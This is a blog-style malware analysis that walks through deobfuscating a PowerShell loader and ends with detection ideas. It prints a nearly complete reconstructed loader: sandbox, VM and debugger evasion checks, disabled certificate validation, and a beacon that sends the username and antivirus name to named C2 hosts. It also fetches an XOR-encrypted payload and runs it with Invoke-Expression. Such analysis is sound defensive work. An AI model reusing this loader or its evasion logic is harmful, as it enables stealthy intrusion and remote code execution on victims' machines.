---
title: "From Obfuscated Garbage to Clarity"
date: 2025-05-15
author: "Manuel Boll"
tags: ["Malware-Analysis","PowerShell", "Reverse Engineering", "Blue Team"]
image: "/img/posts/obfuscated_garbage.svg"
images: ["/img/posts/obfuscated_garbage.png"]
---


A colleague dropped a PowerShell script on my desk that looked like a keyboard cat had been let loose on a text editor. Randomised variable names, integers being divided by two and cast to `[char]`, everything wrapped in an outer `iex`. At the time of writing it was still zero-detection on [VirusTotal](https://www.virustotal.com/gui/file/1339581bb26e157363b5b2ee044a6f97adfc672688915ad1ff01481ef4bfc382), which is a useful reminder that "zero detections" is a statement about AV signatures on a specific day, not about how much effort went into hiding the payload. The framework is public — it came from the [ZHacker13/ReverseTCPShell](https://github.com/ZHacker13/ReverseTCPShell) repository — so the family is not a mystery. The deobfuscation is worth walking through anyway, because the tricks recur across almost every commodity PowerShell loader I look at.

The interesting part is that the obfuscation is entirely superficial. One XOR-ish trick hides the strings, one naming convention hides the API surface, and once both are spotted the rest of the work is mechanical find-and-replace. This post walks it from first look to the reconstructed script — every helper, every anti-analysis check, and the two C2 endpoints falling out at the bottom.

- - -

1\. First look
--------------

The script opens with a function whose signature is essentially unreadable:

```powershell
function DRLGJTjyWALFmvoywkxE{
    $gQNWEbnZTqqnpvELC = New-Object System.Reflection.AssemblyName($($("""$($((174,210,220,102,100)|%{[char]($_/2)})-join'')""")|iex));
    # ... several hundred lines of the same shape ...
}
```

Two things carry all the signal. Every variable and function name is a random alphabet soup — which means none of them are load-bearing and I can rename them to anything I like without breaking anything. And every user-visible string is a run-time expression: an integer array divided by two, cast to `[char]`, joined, and passed to `iex`. That is the whole "encryption" — no key derivation, no state, no rotation. Just `x → [char](x/2)`, done the same way across the entire file.

- - -

2\. Undoing the string encoding
-------------------------------

The encoded string in the very first line is a good test case:

```powershell
$($((174,210,220,102,100)|%{[char]($_/2)})-join'')
```

By hand:

```
[char](174/2) = [char]87  = 'W'
[char](210/2) = [char]105 = 'i'
[char](220/2) = [char]110 = 'n'
[char](102/2) = [char]51  = '3'
[char](100/2) = [char]50  = '2'
```

`Win32`. That is the name being handed to `System.Reflection.AssemblyName`, which is the first breadcrumb: this script is about to build a dynamic assembly and P/Invoke into `kernel32.dll`. Once the trick is confirmed, every other `x/2` array in the file decodes the same way. A one-liner across the whole script surfaces the vocabulary the author wanted hidden: `Win32`, `MEMORYSTATUSEX`, `kernel32.dll`, `GlobalMemoryStatusEx`, `IsDebuggerPresent`, `GetTickCount64`, `GetDiskFreeSpaceExA`. At that point the shape of the script is no longer a secret — it is going to import Win32 primitives at run time and use them to sanity-check its environment.

- - -

3\. Rebuilding the run-time P/Invoke
------------------------------------

The first big function is doing something specific and worth spelling out. It builds a **dynamic assembly**, defines a value type called `MEMORYSTATUSEX` with the exact layout Windows expects (`dwLength`, `dwMemoryLoad`, `ullTotalPhys`, and the rest), and then attaches P/Invoke method definitions for four Win32 functions to a second dynamically-defined type:

```powershell
$funcs = @(
    @{Name="GlobalMemoryStatusEx"; RetType=[bool];   ParamTypes=[Type[]]@([MEMORYSTATUSEX].MakeByRefType())},
    @{Name="GetTickCount64";      RetType=[UInt64]; ParamTypes=[Type[]]@()},
    @{Name="IsDebuggerPresent";   RetType=[bool];   ParamTypes=[Type[]]@()},
    @{Name="GetDiskFreeSpaceExA"; RetType=[bool];   ParamTypes=[Type[]]@([IntPtr],[UInt64].MakeByRefType(),[UInt64].MakeByRefType(),[UInt64].MakeByRefType())}
)
```

Doing it this way — through `Reflection.Emit` — rather than the ergonomic `Add-Type -MemberDefinition '[DllImport(...)]…'` path avoids two things the author does not want. `Add-Type` shells out to `csc.exe`, which drops temp `.cs` and `.dll` files under `%TEMP%\<user>\<hash>\` and lights up any Sysmon rule that watches for csc-under-PowerShell. `Reflection.Emit` leaves neither on disk: the assembly is built in memory, the PInvoke signatures are attached, and the resolved APIs are callable through the second dynamically-defined type as if they had been imported the normal way. In the obfuscated script that type is called `rOQcgNZuUHOSIIzxCh`; renaming it to `Win32` is a small quality-of-life improvement.

Once the imports are in place, the four APIs give away exactly what the anti-analysis stage is going to check. Anyone reading the imports has the checklist before reading any of the checks.

- - -

4\. The evasion checks, one by one
----------------------------------

The environment checks are eight short helper functions, each returning `$true` when it thinks it is looking at analysis infrastructure. The naming after decoding is uniform enough to read them off:

**`IsLowRAM`** allocates a `MEMORYSTATUSEX`, calls `GlobalMemoryStatusEx`, and returns `$true` if physical RAM is under 256 MB. That is a classic sandbox tell — real endpoints do not run on 256 MB in 2025, and most sandboxes still cap detonation VMs low to save host resources across a big detonation queue.

**`IsLowDisk`** uses `GetDiskFreeSpaceExA` and returns `$true` if total disk is under 10 GB. Same idea, disk edition.

**`IsRecentlyStarted`** calls `GetTickCount64` and returns `$true` if the system booted less than three minutes ago. Sandbox VMs get spun up fresh for each detonation; a real user's laptop has been on for hours or weeks.

**`IsDebuggerPresent`** is just the Win32 function of the same name. Cheap and universally recognised — and, incidentally, the one check that trips even the laziest interactive analysis.

**`Is32BitOrOldWindows`** checks whether `${Env:ProgramFiles(x86)}` is unset. If it is, the host is 32-bit Windows and the author would rather not run there — probably because the payload the C2 will deliver is 64-bit.

**`IsSandboxProcessRunning`** iterates every process via `Get-WmiObject Win32_Process` and matches names against a hard-coded list. The list is straightforward and worth reading top to bottom:

```
ollydbg.exe, processhacker.exe, immunitydebugger.exe,
wireshark.exe, dumpcap.exe, hookexplorer.exe, petools.exe,
lordpe.exe, proc_analyzer.exe, sysanalyzer.exe, sniff_hit.exe,
windbg.exe, joeboxcontrol.exe, joeboxserver.exe, resourcehacker.exe,
x32dbg.exe, x64dbg.exe, httpdebugger.exe, qemu-ga.exe,
vboxservice.exe, vboxtray.exe, vmsrvc.exe, vmusrvc.exe,
vmtoolsd.exe, vmwaretray.exe, vmwareuser.exe,
vgauthservice.exe, vmacthlp.exe, xenservice.exe
```

Two clusters: reverse-engineering tools an analyst would have open, and hypervisor guest agents (`vboxservice`, `vmtoolsd`, `qemu-ga`, `xenservice`) that only appear on a VM. Both make excellent YARA material and both are hard to remove without breaking the guest.

**`IsSuspiciousHostname`** compares the machine name against a small list of well-known sandbox defaults: `SANDBOX`, `7SILVIA`, `HANSPETER-PC`, `JOHN-PC`, `MUELLER-PC`, `WIN7-TRAPS`, `FORTINET`, `TEQUILABOOMBOOM`. `TEQUILABOOMBOOM` is a Cuckoo default that has been around long enough to have become its own IOC — if you see it in production, something is either very wrong or very much a lab.

**`IsVmVendor`** goes straight at the SMBIOS: system manufacturer, system model, BIOS version, motherboard manufacturer and product, checked against `QEMU`, `VIRTUALBOX`, `VMWARE`. A `SerialNumber` of `0` also counts.

**`IsCleanEnvironment`** is the aggregation: it OR-chains all eight checks, returns nothing if any of them fires, and only emits `$true` on a machine that passed every gate.

None of these are hard to bypass individually — half of them can be defeated by renaming a process or editing an SMBIOS string — but the point is not to defeat a determined analyst. It is to filter out the lazy 90% of detonation environments, and for that the list is long enough.

- - -

5\. The main flow
-----------------

The main function (in the obfuscated original: `ExfiltrateAndLoadPayload`, which is an unusually honest name) is short and does exactly four things:

1. Collect the current username and the installed AV product name via `root\SecurityCenter2 AntivirusProduct`.
2. Confirm the current user is a local administrator (WMI walk of `Win32_GroupUser` against SID `S-1-5-32-544`).
3. If admin and `IsCleanEnvironment`, fetch the payload from a hardcoded C2 URL, XOR-decrypt it with a key baked into the script, and pipe the result into `Invoke-Expression` for in-memory execution.
4. If the checks fail or anything goes wrong, phone home to a diagnostic URL with the PowerShell version, architecture, and a Base64-encoded exception string.

The C2 URLs come out in cleartext once the string decoding is applied:

```
Beacon:   https://host5676.info:14755/b_<base64(user)>_<base64(av)>
Payload:  https://dlhost5676.info:14755/tt_b
Fallback: https://host5676.info:14755/fallback
Errors:   https://host5676.info:14755/error
```

Port `14755` is not a random number — it is the same non-privileged port across all four endpoints, and the sort of consistency that is very kind to whoever is writing the YARA rule. The payload delivery is a two-step: a Base64 blob is downloaded via `WebClient.DownloadString`, `FromBase64String`'d, XOR-decrypted with a key the script keeps in a variable, and executed via `Invoke-Expression`. Nothing touches disk.

The certificate validation callback is unconditionally set to always return `$true` before the requests go out:

```powershell
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
```

The C2 does not need a valid certificate. On the operator side that saves a Let's Encrypt renewal; on the defender side a PowerShell process disabling TLS validation before making a web request looks nothing like anything a legitimate script would do, and it is one of the shorter detection queries you will ever write.

- - -

6\. The cleaned-up script
-------------------------

Once every helper is renamed and every string decoded, the whole thing collapses into a readable ~200 lines:

```powershell
function InitWin32 {
    # Build a dynamic assembly with:
    #   struct MEMORYSTATUSEX { dwLength; dwMemoryLoad; ullTotalPhys; ... }
    #   class  Win32 with P/Invoke methods:
    #     GlobalMemoryStatusEx(ref MEMORYSTATUSEX)
    #     GetTickCount64()
    #     IsDebuggerPresent()
    #     GetDiskFreeSpaceExA(IntPtr, ref UInt64, ref UInt64, ref UInt64)
}

function Is32BitOrOldWindows { return !${Env:ProgramFiles(x86)} }
function IsDebuggerPresent   { return [Win32]::IsDebuggerPresent() }
function IsRecentlyStarted   { return ([Win32]::GetTickCount64() -lt (1000 * 60 * 3)) }

function IsLowRAM {
    $ms = New-Object MEMORYSTATUSEX
    $ms.dwLength = 64
    if (![Win32]::GlobalMemoryStatusEx([ref]$ms)) { return $false }
    return ([int]($ms.ullTotalPhys / 1MB) -lt 256)
}

function IsLowDisk {
    [UInt64]$total = 0
    if (![Win32]::GetDiskFreeSpaceExA([IntPtr]::Zero,[ref]0,[ref]$total,[ref]0)) { return $false }
    return ([int]($total / 1MB) -lt 10240)
}

function IsSandboxProcessRunning {
    $targets = @('ollydbg.exe','processhacker.exe',...,'xenservice.exe')
    foreach ($p in Get-WmiObject Win32_Process) {
        if ($targets -contains $p.Name.ToLower()) { return $true }
    }
    return $false
}

function IsSuspiciousHostname {
    $sandboxes = @('SANDBOX','7SILVIA','HANSPETER-PC','JOHN-PC','MUELLER-PC',
                   'WIN7-TRAPS','FORTINET','TEQUILABOOMBOOM')
    return $sandboxes -contains ([System.Net.Dns]::GetHostName()).ToUpper()
}

function IsVmVendor {
    if ((Get-WmiObject Win32_BIOS).SerialNumber -eq 0) { return $true }
    $probes = @(
        (Get-WmiObject Win32_ComputerSystem).Manufacturer,
        (Get-WmiObject Win32_ComputerSystem).Model,
        (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion,
        (Get-WmiObject Win32_BaseBoard).Manufacturer,
        (Get-WmiObject Win32_BaseBoard).Product
    ) | ForEach-Object { ([string]$_).ToUpper() }
    foreach ($p in $probes) {
        foreach ($v in @('QEMU','VIRTUALBOX','VMWARE')) {
            if ($p -match $v) { return $true }
        }
    }
    return $false
}

function IsCleanEnvironment {
    if (Is32BitOrOldWindows -or IsDebuggerPresent -or IsRecentlyStarted -or
        IsLowRAM             -or IsLowDisk         -or IsSandboxProcessRunning -or
        IsSuspiciousHostname -or IsVmVendor) { return $false }
    return $true
}

function XorDecrypt {
    param ([byte[]]$data, [string]$key)
    $kb = [Text.Encoding]::UTF8.GetBytes($key)
    $out = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $kb[$i % $kb.Length]
    }
    return $out
}

function Main {
    InitWin32
    $user   = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $userB64 = [Uri]::EscapeUriString([Convert]::ToBase64String(
                    [Text.Encoding]::ASCII.GetBytes($user)))
    $av     = (Get-WmiObject -Namespace 'root\SecurityCenter2' -Class AntivirusProduct).DisplayName
    $avB64  = [Uri]::EscapeUriString([Convert]::ToBase64String(
                    [Text.Encoding]::ASCII.GetBytes(([string]$av))))
    $admin  = IsCurrentUserAdmin $user

    if ($user -and $admin -and (IsCleanEnvironment)) {
        [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        $wc = New-Object Net.WebClient
        try { $wc.DownloadString("https://host5676.info:14755/b_${userB64}_${avB64}") } catch {}
        try {
            $b64 = $wc.DownloadString("https://dlhost5676.info:14755/tt_b")
            $bytes = XorDecrypt ([Convert]::FromBase64String($b64)) "<xor_key>"
            Invoke-Expression ([Text.Encoding]::ASCII.GetString($bytes))
        } catch {}
    } else {
        try { (New-Object Net.WebClient).DownloadString("https://host5676.info:14755/fallback") } catch {}
    }
}

Main
```

That is the whole script. Everything that was hard to look at was cosmetic.

- - -

7\. What is worth keeping
-------------------------

There is a published YARA rule from Florian Roth that catches this exact family: [`HKTL_ReverseTCPShell_Dec19`](https://valhalla.nextron-systems.com/info/rule/HKTL_ReverseTCPShell_Dec19). It is the right rule to have deployed and it does what it says on the tin. That said, the rule matches the *code*: a fresh cut of the framework with new variable and function names will still fall out to it, but a rewrite that keeps the *technique* (dynamic assembly, `Reflection.Emit` P/Invoke, XOR string table, HTTPS beacon on a fixed odd port) and swaps the surface is exactly the shape of thing that walks past a code-shape rule.

The technique-level detections worth writing, from this sample:

- **PowerShell processes calling `DefineDynamicAssembly` + `DefinePInvokeMethod`.** There are legitimate reasons to do this, but not many, and almost none from an interactive session on a user endpoint. AMSI logging captures the script text; Sysmon EID 1 catches the parent-child; a rule that fires on both together will surface almost every commodity `Reflection.Emit`-based loader.
- **Any PowerShell process setting `ServerCertificateValidationCallback` to always return `$true` before making a web request.** That is a cleartext confession that whatever is being contacted does not have a valid certificate, and the string is short enough to fit in a single AMSI regex.
- **HTTPS beacons on port 14755** or any other non-standard, non-privileged port to a residential-shaped host. Both `host5676.info` and `dlhost5676.info` are worth adding to any watchlist still tracking this family.
- **`Invoke-Expression` on the output of `WebClient.DownloadString` in the same script.** Almost always malicious; occasionally very lazy DevOps. Either way worth reviewing.

The XOR string trick is the least interesting part of the sample. It only defeats `strings(1)` and analysts who did not look for a moment. The dynamic-assembly P/Invoke is where the real evasion lives — and everything downstream of it, including the two C2 hosts and the eight environment checks, was already legible before any decoding at all.

- - -

Obfuscation in PowerShell is almost always doing string hiding and variable-name mangling, and almost never anything harder. Rename everything, decode the strings once, and the payload is right there in front of you. What takes the actual time is not undoing the hiding — it is deciding which of the anti-analysis checks are worth writing detections against, and which are just there to slow down the next analyst so the author gets one extra week of shelf life. This one gave up most of that for free.
